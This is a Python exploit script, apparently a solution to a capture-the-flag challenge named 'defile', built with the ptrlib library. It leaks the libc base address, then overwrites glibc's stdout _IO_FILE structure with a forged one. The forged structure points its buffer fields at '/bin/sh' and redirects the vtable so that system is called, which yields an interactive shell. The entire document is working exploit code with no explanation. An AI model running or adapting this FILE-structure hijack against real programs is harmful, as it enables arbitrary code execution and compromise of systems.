from ptrlib import *

libc = ELF("./libc.so.6")
sock = Process("./defile")


sock.recvline()
libc_base = int(sock.recvline(), 16) - libc.symbol("_IO_2_1_stdout_")
logger.info("libc base = " + hex(libc_base))

sock.recvline()
sock.sendline("256")

address = libc_base + libc.symbol("_IO_2_1_stdout_")
sock.recvline()
sock.send(str(address))

new_size = libc_base + next(libc.find("/bin/sh"))
payload  = p64(0xfbad1800)
payload += p64(libc_base + libc.symbol("_IO_2_1_stdout_") + 132)# _IO_read_ptr
payload += p64(libc_base + libc.symbol("_IO_2_1_stdout_") + 132)# _IO_read_end
payload += p64(libc_base + libc.symbol("_IO_2_1_stdout_") + 132)# _IO_read_base
payload += p64(0)                                               # _IO_write_base
payload += p64((new_size - 100) // 2)                           # _IO_write_ptr
payload += p64(0)                                               # _IO_write_end
payload += p64(0)                                               # _IO_buf_base
payload += p64((new_size - 100) // 2)                           # _IO_buf_end
payload += p64(0) * 4
payload += p64(libc_base + libc.symbol("_IO_2_1_stdin_"))
payload += p64(1)
payload += p64((1 << 64) - 1)
payload += p64(0x0a000000)
payload += p64(libc_base + 0x3ed8c0)
payload += p64((1 << 64) - 1)
payload += p64(0)
payload += p64(libc_base + 0x3eb8c0)
payload += p64(0) * 6
payload += p64(libc_base + 0x3e8360)
payload += p64(libc_base + libc.symbol("system"))
sock.recvline()
sock.send(payload)

sock.interactive()
